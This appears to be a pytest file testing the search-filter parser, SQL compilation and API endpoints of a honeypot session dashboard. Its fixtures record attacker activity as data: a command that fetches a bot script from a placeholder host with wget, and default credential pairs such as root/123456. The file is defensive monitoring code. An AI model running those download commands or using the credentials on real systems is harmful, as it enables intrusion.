import pytest
from fastapi.testclient import TestClient

from app.db import connect
from app.main import create_app
from app.search_filter import FilterError, Term, compile_filter, legacy_terms, parse, quote


def test_parse_fields_values_negation_and_quotes():
    assert parse('ip:45.* country:CN,RU -user:root cmd:"wget http,x" dur>=5m') == [
        Term("ip", ":", ("45.*",)),
        Term("country", ":", ("CN", "RU")),
        Term("user", ":", ("root",), negate=True),
        Term("cmd", ":", ("wget http,x",)),
        Term("dur", ">=", ("5m",)),
    ]
    assert parse('cmd:"say \\"hi\\""') == [Term("cmd", ":", ('say "hi"',))]
    assert parse("protocol:telnet username:admin") == [Term("proto", ":", ("telnet",)), Term("user", ":", ("admin",))]


def test_bare_words_become_ip_or_command():
    assert parse("203.0.113.5 45.* wget -busybox http://x/y.sh") == [
        Term("ip", ":", ("203.0.113.5",)),
        Term("ip", ":", ("45.*",)),
        Term("cmd", ":", ("wget",)),
        Term("cmd", ":", ("busybox",), negate=True),
        Term("cmd", ":", ("http://x/y.sh",)),
    ]
    assert parse("") == []


@pytest.mark.parametrize(
    "text, message",
    [
        ("foo:bar", "champ inconnu"),
        ('cmd:"open', "guillemet"),
        ("ip:not-an-ip", "ip"),
        ("ip:10.0.0.0/99", "plage"),
        ("dur>abc", "dur"),
        ("dur:60", "dur"),
        ("user>3", "seul dur"),
        ("login:maybe", "login"),
        ("file:zz", "file"),
        ("proto:http", "proto"),
        ("country:CN,", "vide"),
        (" ".join(["user:a"] * 21), "maximum"),
    ],
)
def test_invalid_queries_explain_themselves(text, message):
    with pytest.raises(FilterError, match=message):
        parse(text)


def test_quote_round_trips():
    for value in ["root", "wget http://x", 'say "hi"', "a,b", "back\\slash"]:
        assert parse(f"cmd:{quote(value)}") == [Term("cmd", ":", (value,))]
    assert legacy_terms(ip="203.0.113.5", command="uname -a") == 'ip:203.0.113.5 cmd:"uname -a"'


@pytest.fixture
def db(tmp_path):
    db = connect(tmp_path / "db.sqlite3")
    db.executescript(
        """
        INSERT INTO sessions (session_id, src_ip, protocol, connect_time, duration_ms, login_username, login_password, login_success)
        VALUES
          ('a', '45.1.2.3',    'ssh',    '2026-11-01T10:00:00Z', 120000, 'root',  '123456', 1),
          ('b', '45.9.9.9',    'telnet', '2026-11-01T10:00:00Z', 5000,   'admin', 'admin',  0),
          ('c', '198.51.100.7', NULL,    '2026-11-01T10:00:00Z', NULL,   NULL,    NULL,     NULL),
          ('d', '203.0.113.130', 'ssh',  '2026-11-01T10:00:00Z', 30000,  'ubnt',  'ubnt',   0);
        INSERT INTO geo_cache (ip, country, country_code, looked_up_at) VALUES
          ('45.1.2.3', 'China', 'CN', 'x'), ('45.9.9.9', 'Russia', 'RU', 'x'), ('198.51.100.7', 'France', 'FR', 'x');
        INSERT INTO ip_enrichment (ip, asn, asn_org, status) VALUES ('45.1.2.3', 14061, 'DigitalOcean, LLC', 'done');
        INSERT INTO commands (session_id, timestamp, input_text) VALUES
          ('a', 't', 'cd /tmp; wget http://x/bot.sh'), ('d', 't', 'uname -a');
        INSERT INTO session_files (session_id, timestamp, kind, shasum) VALUES ('a', 't', 'download', 'abcdef0123');
        """
    )
    return db


def _ids(db, text):
    sql, params, _ = compile_filter(text)
    return sorted(r[0] for r in db.execute("SELECT session_id FROM sessions s WHERE 1=1" + sql, params))


@pytest.mark.parametrize(
    "text, expected",
    [
        ("ip:45.*", ["a", "b"]),
        ("ip:45.0.0.0/8", ["a", "b"]),
        ("ip:203.0.113.128/25", ["d"]),  # not octet-aligned: Python function
        ("45.9.9.9", ["b"]),
        ("country:CN,RU", ["a", "b"]),
        ("country:france", ["c"]),
        ("-country:CN", ["b", "c", "d"]),  # no geo row still counts as "not CN"
        ("asn:14061", ["a"]),
        ("asn:AS14061", ["a"]),
        ("asn:digitalocean", ["a"]),
        ("proto:ssh", ["a", "c", "d"]),  # NULL protocol is ssh
        ("user:root,admin", ["a", "b"]),
        ("-user:root", ["b", "c", "d"]),  # no login is not root
        ("pass:12*", ["a"]),
        ("cmd:wget", ["a"]),
        ("wget", ["a"]),
        ("-cmd:wget", ["b", "c", "d"]),
        ('cmd:"uname -a"', ["d"]),
        ("cmd:50%", []),  # % is literal, not a wildcard
        ("dur>60", ["a"]),
        ("dur<1m", ["b", "d"]),
        ("dur>=30", ["a", "d"]),
        ("login:ok", ["a"]),
        ("login:failed", ["b", "d"]),
        ("login:none", ["c"]),
        ("file:any", ["a"]),
        ("file:download", ["a"]),
        ("file:upload", []),
        ("file:ABCDEF", ["a"]),
        ("ip:45.* -user:admin dur>60", ["a"]),
    ],
)
def test_filters_select_the_right_sessions(db, text, expected):
    assert _ids(db, text) == expected


def test_api_endpoints_accept_the_filter(db):
    db.commit()
    client = TestClient(create_app(db=db, start_background_tasks=False))
    sessions = client.get("/api/sessions", params={"filter": "country:CN,RU dur>10"}).json()
    assert [s["session_id"] for s in sessions["items"]] == ["a"]
    overview = client.get("/api/overview", params={"period": "all", "filter": "login:failed"}).json()
    assert overview["total_connections"] == 2
    commands = client.get("/api/commands", params={"period": "all", "filter": "user:ubnt"}).json()
    assert [c["input_text"] for c in commands["items"]] == ["uname -a"]
    bad = client.get("/api/sessions", params={"filter": "nope:1"})
    assert bad.status_code == 400 and "champ inconnu" in bad.json()["detail"]
    # Older links still work and combine with the search text.
    legacy = client.get("/api/sessions", params={"ip": "45.1.2.3", "filter": "user:root"}).json()
    assert legacy["total"] == 1


def test_overlong_filter_text_is_refused_before_parsing():
    with pytest.raises(FilterError, match="trop long"):
        parse("A" * 5000)
    with pytest.raises(FilterError, match="trop long"):
        parse("a " * 3000)
